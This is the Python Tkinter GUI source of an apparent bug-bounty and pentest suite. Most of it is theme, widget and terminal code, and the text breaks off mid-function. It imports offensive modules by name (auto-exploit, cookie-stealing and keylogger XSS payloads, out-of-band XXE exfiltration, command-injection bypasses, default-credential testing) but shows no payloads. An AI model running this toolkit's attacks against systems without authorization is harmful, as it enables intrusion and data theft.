#!/usr/bin/env python3
"""
TeamCyberOps Suite v3 — Ultra-Premium Bug Bounty Framework
Kali Linux | Python 3 | Tkinter
Default login: admin / admin
"""
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog, simpledialog
import threading, queue, json, os, sys, csv, subprocess, shutil, webbrowser, urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional

BASE_DIR    = Path(__file__).parent
DB_DIR      = BASE_DIR / "db"
REPORTS_DIR = BASE_DIR / "reports"
SCREENSHOTS = BASE_DIR / "screenshots"
LOGS_DIR    = BASE_DIR / "logs"
WORDLISTS   = BASE_DIR / "wordlists"
for _d in [DB_DIR, REPORTS_DIR, SCREENSHOTS, LOGS_DIR, WORDLISTS]:
    _d.mkdir(exist_ok=True)

sys.path.insert(0, str(BASE_DIR))
from core import auth
from core import notify as notifier
from modules.recon import passive as recon_passive
from modules.recon import active   as recon_active
from modules.recon import origin_hunter
from modules.recon import url_discovery
from modules.recon import dorks as dorks_module
from modules.recon import oneliners as oneliners_module
from modules.recon import smart_recon
from modules.ai import assistant as ai_assistant
from modules.recon.auto_pipeline import AutoReconPipeline, get_pipeline_for_target, PIPELINE_PHASES, check_tools
from modules.analysis.cve_fetcher import search_nvd, fetch_cisa_kev, search_exploitdb, full_vuln_intel, is_in_kev, get_recent_cves, get_cves_for_tech
from modules.analysis.payload_fetcher import fetch_patt_payloads, fetch_wordlist, PATT_CATEGORIES, WORDLIST_NAMES, get_exploit_payloads
from modules.advanced.tools import (BUILTIN_WORKFLOWS, JWT_ATTACKS, DEFAULT_CREDENTIALS,
    BUSINESS_LOGIC_CHECKS, get_public_programs_list, list_workflows, run_workflow,
    add_monitor, load_monitors, run_monitor_check, test_default_creds,
    enumerate_buckets, check_cloud_metadata, test_idor, fuzz_api_versions,
    test_mass_assignment, analyze_session, save_program, load_programs,
    get_business_logic_checklist)
from modules.ai import auto_exploit
from modules.osint import engine as osint_engine
from modules.http import replayer as http_replayer
from modules.nuclei_mgr import manager as nuclei_mgr
from modules.analysis import security_tools as sec_tools
from modules.vuln  import scanner  as vuln_scanner
from modules.exploit.payloads import (
    XSS_BASIC, XSS_ENCODED, XSS_COOKIE_STEAL,
    SQLI_BASIC, SQLI_BLIND,
    SSRF_PAYLOADS, LFI_PAYLOADS,
    SSTI_PAYLOADS, SSTI_JINJA2, SSTI_DJANGO,
    XXE_PAYLOADS, CMD_INJECT, CMD_INJECT_BYPASS,
    OPEN_REDIRECT, CORS_BYPASS, LDAP_INJECT,
    CSP_BYPASSES, analyze_csp, get_payloads,
)
from reporting.cvss      import calculate_cvss, score_to_severity, severity_color, METRIC_LABELS
from reporting.generator import (generate_html_report, generate_hackerone_report,
                                  generate_bugcrowd_report, generate_markdown_report)
from utils.wordlist import list_wordlists, count_lines, save_custom_wordlist, merge_wordlists, get_best_wordlist
from utils.proxy    import set_proxy, clear_proxy, set_burp, disable_burp, get_proxy_status, get_current_ip, open_folder, open_file, launch_terminal
import platform
IS_WINDOWS = platform.system() == "Windows"

def shell_cmd(bash_cmd_str):
    """Return platform-appropriate shell command list.
    On Windows: uses cmd /c (or WSL bash if available)
    On Linux/macOS: uses bash -c
    """
    if IS_WINDOWS:
        # Try WSL bash first, fallback to cmd
        if shutil.which("bash"):
            return ["bash", "-c", bash_cmd_str]
        else:
            # Convert basic pipe commands for cmd.exe
            return ["cmd", "/c", bash_cmd_str]
    return ["bash", "-c", bash_cmd_str]

# ── Try importing extended payload lists ──────────────────────────────────────
try:
    from modules.exploit.payloads import (
        XSS_DOM_BASED, XSS_KEYLOGGER,
        SQLI_UNION, SQLI_BOOLEAN_BLIND, SQLI_ERROR_BASED, SQLI_STACKED, SQLI_BYPASS_WAF,
        SSRF_ADVANCED, SSRF_BYPASS, SSRF_PROTOCOL,
        LFI_PHP_WRAPPER, LFI_LOG_POISON, LFI_ENCODING_BYPASS,
        SSTI_MAKO, XXE_BLIND, XXE_OOB_EXFIL,
        REDIRECT_BYPASS, CORS_WILDCARD_EXPLOIT,
    )
except ImportError:
    XSS_DOM_BASED = XSS_KEYLOGGER = []
    SQLI_UNION = SQLI_BOOLEAN_BLIND = SQLI_ERROR_BASED = SQLI_STACKED = SQLI_BYPASS_WAF = []
    SSRF_ADVANCED = SSRF_BYPASS = SSRF_PROTOCOL = []
    LFI_PHP_WRAPPER = LFI_LOG_POISON = LFI_ENCODING_BYPASS = []
    SSTI_MAKO = XXE_BLIND = XXE_OOB_EXFIL = []
    REDIRECT_BYPASS = CORS_WILDCARD_EXPLOIT = []

# ── ANSI Color Code Stripping ──────────────────────────────────────────────────
import re
def strip_ansi(text):
    """Remove ANSI color codes from text."""
    return re.sub(r'\x1b\[[0-9;]*m', '', text)

# ══════════════════════════════════════════════════════════════════════════════
#  ULTRA-PREMIUM DESIGN SYSTEM — Black Terminal Hacker Aesthetic
# ══════════════════════════════════════════════════════════════════════════════

DARK = {
    # ── ULTRA DARK CYBERPUNK — Elite Hacker Aesthetic ───────────
    'BG':      '#050810',   # void black (deepest)
    'BG2':     '#080d18',   # panel / card bg
    'BG3':     '#0d1525',   # input / section bg
    'BG4':     '#121d30',   # hover state
    'BG5':     '#1a2840',   # selected / active
    'BG6':     '#040710',   # sidebar (darkest)
    'FG':      '#e2e8f7',   # primary text — cool white
    'FG2':     '#7a8ba8',   # muted — steel blue-grey
    'FG3':     '#3a4a62',   # very muted
    # ── Neon Accent Palette — Cyberpunk Glow ─────────────────────
    'ACCENT':  '#00f5ff',   # electric ice blue (primary)
    'ACCENT2': '#7c3aed',   # deep violet
    'GREEN':   '#00ff88',   # matrix neon green
    'RED':     '#ff2d55',   # alert red
    'YELLOW':  '#ffd60a',   # electric gold
    'PURPLE':  '#bf5af2',   # neon purple
    'CYAN':    '#32d9fa',   # bright teal
    'ORANGE':  '#ff9f0a',   # amber neon
    'PINK':    '#ff375f',   # neon pink
    # ── Borders ──────────────────────────────────────────────────
    'BORDER':  '#1e2d45',
    'BORDER2': '#00f5ff',   # neon glow border
    # ── Terminal ─────────────────────────────────────────────────
    'TERM_BG': '#020408',   # pure terminal black
    'TERM_FG': '#00ff88',   # matrix green
    # ── Severity backgrounds ──────────────────────────────────────
    'SEV_CRIT_BG': '#1a0010',
    'SEV_HIGH_BG': '#1a0a00',
    'SEV_MED_BG':  '#00101a',
    'SEV_LOW_BG':  '#001a0a',
    'SEV_INFO_BG': '#080d18',
}
LIGHT = {
    # Clean professional light
    'BG':      '#f6f8fa',
    'BG2':     '#ffffff',
    'BG3':     '#f0f2f5',
    'BG4':     '#e4e8ef',
    'BG5':     '#d0d7e0',
    'BG6':     '#f0f2f5',
    'FG':      '#1c2128',
    'FG2':     '#57606a',
    'FG3':     '#8c959f',
    'ACCENT':  '#0969da',
    'ACCENT2': '#8250df',
    'GREEN':   '#1a7f37',
    'RED':     '#cf222e',
    'YELLOW':  '#9a6700',
    'PURPLE':  '#6639ba',
    'CYAN':    '#0550ae',
    'ORANGE':  '#bc4c00',
    'PINK':    '#bf3989',
    'BORDER':  '#d0d7de',
    'BORDER2': '#afb8c1',
    'TERM_BG': '#1c2128',
    'TERM_FG': '#1a7f37',
    'SEV_CRIT_BG': '#fff0f0',
    'SEV_HIGH_BG': '#fff8f0',
    'SEV_MED_BG':  '#f0f8ff',
    'SEV_LOW_BG':  '#f0fff4',
    'SEV_INFO_BG': '#f6f8fa',
}

THEMES = {'dark': DARK, 'light': LIGHT}
_theme = 'dark'

# Global color vars (initialized by apply_theme)
BG=BG2=BG3=BG4=BG5=BG6=FG=FG2=FG3='#000'
ACCENT=ACCENT2=GREEN=RED=YELLOW=PURPLE=CYAN=ORANGE=PINK='#000'
BORDER=BORDER2=TERM_BG=TERM_FG='#000'
SEV_CRIT_BG=SEV_HIGH_BG=SEV_MED_BG=SEV_LOW_BG=SEV_INFO_BG='#000'


def apply_theme(name='dark'):
    global _theme
    global BG, BG2, BG3, BG4, BG5, BG6, FG, FG2, FG3
    global ACCENT, ACCENT2, GREEN, RED, YELLOW, PURPLE, CYAN, ORANGE, PINK
    global BORDER, BORDER2, TERM_BG, TERM_FG
    global SEV_CRIT_BG, SEV_HIGH_BG, SEV_MED_BG, SEV_LOW_BG, SEV_INFO_BG
    _theme = name
    t = THEMES[name]
    BG=t['BG'];   BG2=t['BG2'];  BG3=t['BG3'];  BG4=t['BG4']
    BG5=t['BG5']; BG6=t['BG6']
    FG=t['FG'];   FG2=t['FG2'];  FG3=t['FG3']
    ACCENT=t['ACCENT'];   ACCENT2=t['ACCENT2']
    GREEN=t['GREEN'];     RED=t['RED'];    YELLOW=t['YELLOW']
    PURPLE=t['PURPLE'];   CYAN=t['CYAN'];  ORANGE=t['ORANGE']; PINK=t['PINK']
    BORDER=t['BORDER'];   BORDER2=t['BORDER2']
    TERM_BG=t['TERM_BG']; TERM_FG=t['TERM_FG']
    SEV_CRIT_BG=t['SEV_CRIT_BG']; SEV_HIGH_BG=t['SEV_HIGH_BG']
    SEV_MED_BG=t['SEV_MED_BG'];   SEV_LOW_BG=t['SEV_LOW_BG']
    SEV_INFO_BG=t['SEV_INFO_BG']


apply_theme('dark')


# ── Severity helpers ──────────────────────────────────────────────────────────
def SEV_COLOR(s):
    """Foreground color for severity — neon on dark bg."""
    return {
        'CRITICAL': '#ff4444',
        'HIGH':     '#ffa500',
        'MEDIUM':   '#00ccff',
        'LOW':      '#00ff88',
        'INFO':     '#8b949e',
    }.get(s.upper(), '#8b949e')

def SEV_BG(s):
    """Row background — subtle tint, readable on dark theme."""
    return {
        'CRITICAL': '#200008',
        'HIGH':     '#201000',
        'MEDIUM':   '#001020',
        'LOW':      '#001a08',
        'INFO':     BG3,
    }.get(s.upper(), BG3)

def SEV_BADGE_COLOR(s):
    """Return (fg, bg) tuple for severity badge."""
    return {
        'CRITICAL': ('#ff1744', '#2d0008'),
        'HIGH':     ('#ffea00', '#2d2200'),
        'MEDIUM':   ('#00d4ff', '#00141a'),
        'LOW':      ('#00e676', '#001a0a'),
        'INFO':     ('#7d8590', '#161b22'),
    }.get(s.upper(), ('#7d8590', '#161b22'))


# ── Typography ────────────────────────────────────────────────────────────────
# Platform-aware fonts
import platform as _platform
_SYS = _platform.system()
_MONO_FACE = ('Consolas' if _SYS == 'Windows' else
              'Menlo'    if _SYS == 'Darwin'  else
              'Monospace')
MONO   = (_MONO_FACE, 11)
MONO_B = (_MONO_FACE, 11, 'bold')
MONO_H = (_MONO_FACE, 14, 'bold')
MONO_S = (_MONO_FACE, 10)
MONO_T = (_MONO_FACE, 9)
MONO_L = (_MONO_FACE, 22, 'bold')
MONO_XL= (_MONO_FACE, 30, 'bold')


# ══════════════════════════════════════════════════════════════════════════════
#  DATA HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def load_cfg():
    with open(BASE_DIR/"config.json") as f: return json.load(f)

def save_cfg(data):
    with open(BASE_DIR/"config.json","w") as f: json.dump(data,f,indent=2)

def import_exists(tool: str) -> bool:
    """Check if a tool/command is available."""
    import shutil
    return shutil.which(tool) is not None


def load_findings(project=None):
    """Load findings from DB. Always returns ALL findings regardless of project."""
    try:
        with open(DB_DIR/"findings.json") as f:
            data = json.load(f)
        return data.get("findings", [])
    except Exception:
        return []

def save_finding(finding):
    path = DB_DIR/"findings.json"
    with open(path) as f: data=json.load(f)
    if not finding.get("id"): finding["id"]=f"FIND-{len(data['findings'])+1:04d}"
    if not finding.get("timestamp"): finding["timestamp"]=datetime.now().isoformat()
    data["findings"].append(finding)
    with open(path,"w") as f: json.dump(data,f,indent=2)

def load_projects():
    with open(DB_DIR/"projects.json") as f: return json.load(f).get("projects",[])

def save_project(project):
    path = DB_DIR/"projects.json"
    with open(path) as f: data=json.load(f)
    if not any(p["name"]==project["name"] for p in data["projects"]):
        project.setdefault("created",datetime.now().isoformat())
        data["projects"].append(project)
        with open(path,"w") as f: json.dump(data,f,indent=2)

def write_audit(msg):
    try:
        with open(LOGS_DIR/"audit.log","a") as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
    except Exception: pass

# ══════════════════════════════════════════════════════════════════════════════
#  ULTRA-PREMIUM WIDGET FACTORY
# ══════════════════════════════════════════════════════════════════════════════

def mk_btn(parent, text, cmd=None, color=None, small=False, width=None,
           style='normal', **kw):
    """Cyberpunk neon-glow button."""
    c  = color or ACCENT
    f  = MONO_T if small else MONO_S if style == 'ghost' else MONO
    px = 8 if small else 18
    py = 4 if small else 9

    if style == 'filled':
        b = tk.Button(parent, text=text, command=cmd,
                      bg=c, fg='#000000',
                      relief='flat', bd=0,
                      font=(_MONO_FACE, (MONO_T[1] if small else MONO[1]), 'bold'),
                      cursor='hand2',
                      activebackground=FG, activeforeground='#000000',
                      padx=px, pady=py, **kw)
        b.bind('<Enter>', lambda e, b=b, c=c: b.config(bg=FG))
        b.bind('<Leave>', lambda e, b=b, c=c: b.config(bg=c))
    else:
        b = tk.Button(parent, text=text, command=cmd,
                      bg=BG3, fg=c,
                      relief='flat', bd=0,
                      font=f, cursor='hand2',
                      activebackground=BG5, activeforeground=FG,
                      padx=px, pady=py,
                      highlightthickness=1,
                      highlightbackground=BG5, **kw)
        if width: b.config(width=width)
        def _enter(e, btn=b, clr=c):
            btn.config(bg=BG4, highlightbackground=clr, fg=FG)
        def _leave(e, btn=b, clr=c):
            btn.config(bg=BG3, highlightbackground=BG5, fg=clr)
        b.bind('<Enter>', _enter)
        b.bind('<Leave>', _leave)

    if width: b.config(width=width)
    return b


def mk_icon_btn(parent, icon, text, cmd=None, color=None):
    """Cyberpunk icon button with neon glow."""
    c = color or ACCENT
    f = mk_frame(parent, bg=BG3)
    f.config(highlightthickness=1, highlightbackground=BORDER2, cursor='hand2')
    tk.Label(f, text=icon, bg=BG3, fg=c,
             font=(_MONO_FACE, 12)).pack(side='left', padx=(10,4), pady=6)
    tk.Label(f, text=text, bg=BG3, fg=c,
             font=MONO_S).pack(side='left', padx=(0,10), pady=6)
    def click(e):
        if cmd: cmd()
    def enter(e):
        f.config(bg=BG4, highlightbackground=c)
        for w in f.winfo_children():
            try: w.config(bg=BG4)
            except Exception: pass
    def leave(e):
        f.config(bg=BG3, highlightbackground=BORDER2)
        for w in f.winfo_children():
            try: w.config(bg=BG3)
            except Exception: pass
    for w in [f] + list(f.winfo_children()):
        w.bind('<Button-1>', click)
        w.bind('<Enter>',    enter)
        w.bind('<Leave>',    leave)
    return f


def mk_entry(parent, var=None, w=38, show=None, placeholder='', **kw):
    """Cyberpunk entry with neon focus glow."""
    e = tk.Entry(parent,
                 textvariable=var,
                 bg=BG3, fg=FG,
                 insertbackground=ACCENT,
                 relief='flat', font=MONO,
                 width=w, bd=0,
                 highlightthickness=1,
                 highlightcolor=ACCENT,
                 highlightbackground=BORDER2,
                 selectbackground=BG5,
                 selectforeground=FG,
                 **kw)
    if show: e.config(show=show)
    if placeholder and not var:
        e.insert(0, placeholder)
        e.config(fg=FG3)
        def _fi(ev):
            if e.get() == placeholder:
                e.delete(0, 'end'); e.config(fg=FG)
        def _fo(ev):
            if not e.get():
                e.insert(0, placeholder); e.config(fg=FG3)
        e.bind('<FocusIn>',  _fi)
        e.bind('<FocusOut>', _fo)
    e.bind('<FocusIn>',  lambda ev: e.config(highlightbackground=ACCENT, bg=BG4))
    e.bind('<FocusOut>', lambda ev: e.config(highlightbackground=BORDER2, bg=BG3))
    return e


def mk_frame(parent, bg=None, **kw):
    return tk.Frame(parent, bg=bg or BG2, **kw)


def mk_card(parent, accent_top=False, accent_color=None, **kw):
    """Cyberpunk card — neon border + optional accent top."""
    c = tk.Frame(parent, bg=BG3,
                 highlightthickness=1,
                 highlightbackground=accent_color or BORDER2,
                 **kw)
    if accent_top:
        tk.Frame(c, bg=accent_color or ACCENT, height=2).pack(fill='x')
    return c


def mk_section(parent, text, icon='', color=None):
    """Cyberpunk section header with neon rule."""
    clr = color or ACCENT
    f   = mk_frame(parent, bg=BG2)
    lf  = mk_frame(f, bg=BG2); lf.pack(side='left', fill='x', expand=True)
    t   = f"{icon}  {text}" if icon else text
    tk.Label(lf, text=t, bg=BG2, fg=clr, font=MONO_B).pack(side='left')
    line_f = mk_frame(lf, bg=BG2)
    line_f.pack(side='left', fill='x', expand=True, padx=(10,0), pady=10)
    tk.Frame(line_f, bg=clr, height=1).pack(fill='x', expand=True)
    return f


def mk_stat(parent, label, value, color, subtitle=''):
    """Cyberpunk stat card."""
    c = mk_frame(parent, bg=BG3)
    c.config(highlightthickness=1, highlightbackground=BORDER2)
    tk.Frame(c, bg=color, height=3).pack(fill='x')
    tk.Label(c, text=value, bg=BG3, fg=color, font=MONO_XL).pack(pady=(12,2), padx=14)
    tk.Label(c, text=label, bg=BG3, fg=FG2,   font=MONO_S).pack(pady=(0,4), padx=14)
    if subtitle:
        tk.Label(c, text=subtitle, bg=BG3, fg=FG3, font=MONO_T).pack(pady=(0,8), padx=14)
    else:
        tk.Frame(c, bg=BG3, height=8).pack()
    return c


def mk_tree(parent, columns=(), height=12, show='headings', **kw):
    """Create a TTK Treeview with forced dark colors — fixes invisible rows on Linux."""
    tree = ttk.Treeview(parent, columns=columns, show=show, height=height, **kw)
    # Force colors directly on widget (Linux TTK clam workaround)
    try:
        tree.tk.call('ttk::style', 'configure', 'Treeview',
                     '-background', BG3, '-foreground', FG,
                     '-fieldbackground', BG3)
        tree.tk.call('ttk::style', 'map', 'Treeview',
                     '-foreground', ['selected', '#000000', '!selected', FG],
                     '-background', ['selected', ACCENT, '!selected', BG3])
    except Exception:
        pass
    return tree


def mk_stext(parent, h=10, bg=None, fg=None, font_size=9, **kw):
    """Cyberpunk terminal text widget."""
    t = scrolledtext.ScrolledText(
        parent, height=h,
        bg=bg or TERM_BG,
        fg=fg or TERM_FG,
        font=(_MONO_FACE, font_size),
        relief='flat', bd=0,
        wrap='none',
        selectbackground=BG5,
        selectforeground=FG,
        insertbackground=ACCENT,
        padx=10, pady=8,
        **kw)
    return t


def mk_badge(parent, text, severity='INFO'):
    """Cyberpunk severity badge."""
    fg, bg = SEV_BADGE_COLOR(severity)
    lbl = tk.Label(parent, text=f" {text} ",
                   bg=bg, fg=fg,
                   font=(_MONO_FACE, 8, 'bold'),
                   relief='flat', padx=6, pady=3)
    return lbl


def mk_separator(parent, orient='h', color=None):
    clr = color or BORDER2
    if orient == 'h':
        return tk.Frame(parent, bg=clr, height=1)
    else:
        return tk.Frame(parent, bg=clr, width=1)


def mk_label_value(parent, label, value, label_color=None, value_color=None):
    f = mk_frame(parent, bg=BG2); f.pack(fill='x', pady=2)
    tk.Label(f, text=label, bg=BG2,
             fg=label_color or FG3,
             font=MONO_S, width=20, anchor='e').pack(side='left')
    tk.Label(f, text=value, bg=BG2,
             fg=value_color or FG,
             font=MONO_S).pack(side='left', padx=(8,0))
    return f


# ══════════════════════════════════════════════════════════════════════════════
#  SCROLLABLE FRAME — smooth mouse-wheel scrolling everywhere
# ══════════════════════════════════════════════════════════════════════════════
class ScrollableFrame(tk.Frame):
    """A frame that scrolls vertically with mouse-wheel support."""
    def __init__(self, parent, bg=None, **kw):
        outer = tk.Frame(parent, bg=bg or BG2)
        self._canvas = tk.Canvas(outer, bg=bg or BG2, bd=0,
                                  highlightthickness=0,
                                  relief='flat')
        self._vsb = ttk.Scrollbar(outer, orient='vertical',
                                   command=self._canvas.yview)
        self._canvas.configure(yscrollcommand=self._vsb.set)
        self._vsb.pack(side='right', fill='y')
        self._canvas.pack(side='left', fill='both', expand=True)
        super().__init__(self._canvas, bg=bg or BG2, **kw)
        self._win_id = self._canvas.create_window(
            (0, 0), window=self, anchor='nw')
        self.bind('<Configure>', self._on_frame_configure)
        self._canvas.bind('<Configure>', self._on_canvas_configure)
        self._bind_mousewheel()
        self._outer = outer

    def _on_frame_configure(self, e=None):
        self._canvas.configure(scrollregion=self._canvas.bbox('all'))

    def _on_canvas_configure(self, e):
        self._canvas.itemconfig(self._win_id, width=e.width)

    def _bind_mousewheel(self):
        import platform as _plat
        _os = _plat.system()
        def _scroll(e):
            if _os == 'Windows':
                self._canvas.yview_scroll(int(-1*(e.delta/120)), 'units')
            elif _os == 'Darwin':
                self._canvas.yview_scroll(int(-1*e.delta), 'units')
            else:
                if e.num == 4: self._canvas.yview_scroll(-1, 'units')
                elif e.num == 5: self._canvas.yview_scroll(1, 'units')
        for widget in [self._canvas, self]:
            widget.bind('<MouseWheel>', _scroll)
            widget.bind('<Button-4>',   _scroll)
            widget.bind('<Button-5>',   _scroll)

    def pack(self, **kw):
        self._outer.pack(**kw)
        return self

    def grid(self, **kw):
        self._outer.grid(**kw)
        return self

    def place(self, **kw):
        self._outer.place(**kw)
        return self


def bind_mousewheel(widget, canvas):
    """Bind mouse-wheel on any widget to scroll a canvas."""
    import platform as _plat
    _os = _plat.system()
    def _scroll(e):
        if _os == 'Windows':
            canvas.yview_scroll(int(-1*(e.delta/120)), 'units')
        elif _os == 'Darwin':
            canvas.yview_scroll(int(-1*e.delta), 'units')
        else:
            if e.num == 4: canvas.yview_scroll(-1, 'units')
            elif e.num == 5: canvas.yview_scroll(1, 'units')
    widget.bind('<MouseWheel>', _scroll)
    widget.bind('<Button-4>',   _scroll)
    widget.bind('<Button-5>',   _scroll)


class Tooltip:
    """GitHub-style tooltip popup."""
    def __init__(self, widget, text, delay=600):
        self._widget = widget
        self._text   = text
        self._delay  = delay
        self._tw     = None
        self._job    = None
        widget.bind('<Enter>',   self._schedule)
        widget.bind('<Leave>',   self._cancel)
        widget.bind('<Button>',  self._cancel)

    def _schedule(self, e=None):
        self._cancel()
        self._job = self._widget.after(self._delay, self._show)

    def _cancel(self, e=None):
        if self._job:
            self._widget.after_cancel(self._job)
            self._job = None
        self._hide()

    def _show(self):
        if self._tw: return
        x = self._widget.winfo_rootx() + 20
        y = self._widget.winfo_rooty() + self._widget.winfo_height() + 4
        self._tw = tw = tk.Toplevel(self._widget)
        tw.wm_overrideredirect(True)
        tw.wm_geometry(f"+{x}+{y}")
        tw.configure(bg=BG5)
        tk.Frame(tw, bg=BORDER, height=1).pack(fill='x')
        lbl = tk.Label(tw, text=self._text,
                       bg=BG3, fg=FG,
                       font=MONO_T,
                       padx=10, pady=6,
                       justify='left',
                       wraplength=300)
        lbl.pack()
        tk.Frame(tw, bg=BORDER, height=1).pack(fill='x')

    def _hide(self):
        if self._tw:
            self._tw.destroy()
            self._tw = None


def add_tooltip(widget, text):
    """Attach a tooltip to any widget."""
    return Tooltip(widget, text)
# ══════════════════════════════════════════════════════════════════════════════
class Terminal(tk.Frame):
    """
    Premium hacker terminal with:
    - macOS-style traffic light dots
    - Colored output (ok/err/warn/info/cmd/dim)
    - Copy selected / copy all
    - Save log
    - Stop process
    - Line counter
    - Auto-scroll
    """
    def __init__(self, parent, height=14, title="TERMINAL", **kw):
        super().__init__(parent, bg=TERM_BG, **kw)
        self._q     = queue.Queue()
        self.proc   = None
        self._lines = 0

        # ── Header bar ───────────────────────────────────────────────────
        hdr = tk.Frame(self, bg='#1c1c1c', height=34)
        hdr.pack(fill='x'); hdr.pack_propagate(False)

        # macOS traffic lights
        dot_f = tk.Frame(hdr, bg='#1c1c1c'); dot_f.pack(side='left', padx=12, pady=0)
        self._stop_dot  = tk.Label(dot_f, text='⬤', bg='#1c1c1c', fg='#ff5f57', font=(_MONO_FACE,11), cursor='hand2')
        self._stop_dot.pack(side='left', padx=2)
        self._stop_dot.bind('<Button-1>', lambda e: self.stop())
        tk.Label(dot_f, text='⬤', bg='#1c1c1c', fg='#febc2e', font=(_MONO_FACE,11)).pack(side='left', padx=2)
        tk.Label(dot_f, text='⬤', bg='#1c1c1c', fg='#28c840', font=(_MONO_FACE,11)).pack(side='left', padx=2)

        # Title
        tk.Label(hdr, text=f' ▌ {title}', bg='#1c1c1c', fg=GREEN,
                 font=(_MONO_FACE,9,'bold')).pack(side='left', padx=8)

        # Line counter
        self._line_lbl = tk.Label(hdr, text='0 lines', bg='#1c1c1c', fg=FG3, font=(_MONO_FACE,8))
        self._line_lbl.pack(side='left', padx=4)

        # Right buttons
        btn_defs = [
            ('✂ COPY SEL',  self._copy_selected, FG2),
            ('📋 COPY ALL', self._copy_all,      FG2),
            ('💾 SAVE',     self.save_log,        CYAN),
            ('🗑 CLEAR',    self.clear,            YELLOW),
            ('■ STOP',      self.stop,             RED),
            ('⌨ SHELL',     self._open_shell,      GREEN),
        ]
        for txt, cmd, clr in btn_defs:
            b = tk.Button(hdr, text=txt, command=cmd, bg='#1c1c1c', fg=clr,
                          relief='flat', bd=0, font=(_MONO_FACE,8), cursor='hand2',
                          padx=6, pady=6, activebackground='#2a2a2a', activeforeground=clr)
            b.pack(side='right', padx=1)
            b.bind('<Enter>', lambda e, btn=b: btn.config(bg='#2a2a2a'))
            b.bind('<Leave>', lambda e, btn=b: btn.config(bg='#1c1c1c'))

        # ── Terminal text area ────────────────────────────────────────────
        txt_frame = tk.Frame(self, bg=TERM_BG); txt_frame.pack(fill='both', expand=True)
        self.txt = tk.Text(
            txt_frame, bg=TERM_BG, fg=TERM_FG, font=(_MONO_FACE,9),
            height=height, state='disabled', relief='flat', bd=0,
            insertbackground=GREEN, wrap='char',
            selectbackground=BG5, selectforeground=FG,
            padx=10, pady=6, spacing1=1, spacing3=1)
        sb = ttk.Scrollbar(txt_frame, orient='vertical', command=self.txt.yview)
        self.txt.configure(yscrollcommand=sb.set)
        sb.pack(side='right', fill='y')
        self.txt.pack(side='left', fill='both', expand=True)

        # ── Color tags ───────────────────────────────────────────────────
        self.txt.tag_config('ok',      foreground='#00e676',  font=(_MONO_FACE,9,'bold'))
        self.txt.tag_config('err',     foreground='#ff1744',  font=(_MONO_FACE,9,'bold'))
        self.txt.tag_config('warn',    foreground='#ffea00')
        self.txt.tag_config('info',    foreground='#00d4ff')
        self.txt.tag_config('cmd',     foreground='#ce93d8',  font=(_MONO_FACE,9,'bold'))
        self.txt.tag_config('dim',     foreground='#484f58')
        self.txt.tag_config('ts',      foreground='#30363d')
        self.txt.tag_config('normal',  foreground='#00e676')
        self.txt.tag_config('found',   foreground='#ffea00',  background='#1a1500', font=(_MONO_FACE,9,'bold'))
        self.txt.tag_config('vuln',    foreground='#ff1744',  background='#1a0005', font=(_MONO_FACE,9,'bold'))
        self.txt.tag_config('found',   foreground='#ffea00',  background='#1a1500', font=(_MONO_FACE,9,'bold'))
        self.txt.tag_config('vuln',    foreground='#ff1744',  background='#1a0005', font=(_MONO_FACE,9,'bold'))
        self.txt.tag_config('success', foreground='#00e676',  background='#001a0a', font=(_MONO_FACE,9,'bold'))
        self.txt.tag_config('header',  foreground='#00d4ff',  font=(_MONO_FACE,9,'bold'))
        self.txt.tag_config('ip',      foreground='#f48fb1')
        self.txt.tag_config('url',     foreground='#8be9fd',  underline=1)
        self.txt.tag_config('port',    foreground='#ff9100')

        # ── Search bar (hidden by default) ────────────────────────────────
        self._search_bar = tk.Frame(self, bg='#1c1c1c'); 
        sv = tk.StringVar()
        self._search_var = sv
        tk.Label(self._search_bar, text='🔍', bg='#1c1c1c', fg=FG2, font=MONO_T).pack(side='left', padx=4)
        se = tk.Entry(self._search_bar, textvariable=sv, bg=BG3, fg=FG,
                      font=MONO_T, relief='flat', width=30, insertbackground=ACCENT)
        se.pack(side='left', ipady=3)
        self._match_lbl = tk.Label(self._search_bar, text='', bg='#1c1c1c', fg=FG3, font=MONO_T)
        self._match_lbl.pack(side='left', padx=6)
        sv.trace_add('write', lambda *_: self._search_term(sv.get()))
        # Ctrl+F to show search
        self.txt.bind('<Control-f>', lambda e: self._toggle_search())
        self._search_visible = False

        self._poll()

    def _poll(self):
        try:
            while True:
                tag, line = self._q.get_nowait()
                self._write(line, tag)
        except queue.Empty: pass
        self.after(40, self._poll)

    def _write(self, text, tag='normal'):
        self.txt.config(state='normal')
        ts = datetime.now().strftime('%H:%M:%S')
        self.txt.insert('end', f'[{ts}] ', 'ts')
        # Smart tagging based on content patterns
        if tag == 'normal':
            tag = self._autotag(text)
        self.txt.insert('end', text + '\n', tag)
        self.txt.see('end')
        self.txt.config(state='disabled')
        self._lines += 1
        self._line_lbl.config(text=f'{self._lines} lines')

    def _autotag(self, text):
        tl = text.lower()
        # Vuln found — highest priority styling
        if any(k in tl for k in ['[critical]','[vuln]','vulnerable','injection found','sql injection']):
            return 'vuln'
        if any(k in tl for k in ['[success]','takeover','found!','confirmed']): return 'success'
        if any(k in tl for k in ['critical','error','fail','denied','[error]']): return 'err'
        if any(k in tl for k in ['[high]','found','open','[+]']): return 'found'
        if any(k in tl for k in ['warn','skip','[!]','[medium]']): return 'warn'
        if any(k in tl for k in ['[*]','starting','running','scanning','info']): return 'info'
        if any(k in tl for k in ['http://', 'https://']): return 'url'
        if text.strip().startswith('$ '): return 'cmd'
        if text.strip().startswith('[') and text.strip().endswith(']'): return 'header'
        return 'normal'

    def log(self, text, tag=None):
        self._q.put((tag or self._autotag(text), text))

    def run_command(self, cmd, label='', env=None, user='unknown'):
        full_env = {**os.environ, **(env or {})}
        cmd_str = ' '.join(str(c) for c in cmd)
        self.log(f"$ {cmd_str}", 'cmd')
        self.log(f"[*] Starting: {label or cmd[0]}", 'info')
        # Log command to audit log
        write_audit(f"COMMAND | user={user} | label={label} | cmd={cmd_str[:200]}")
        def _run():
            try:
                p = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT, text=True, env=full_env, bufsize=1)
                self.proc = p
                for line in p.stdout:
                    line = line.rstrip()
                    if line: self.log(strip_ansi(line))
                p.wait()
                if p.returncode == 0:
                    self.log(f"[✓] {label or cmd[0]} completed (exit 0)", 'ok')
                    write_audit(f"COMMAND_SUCCESS | user={user} | label={label}")
                else:
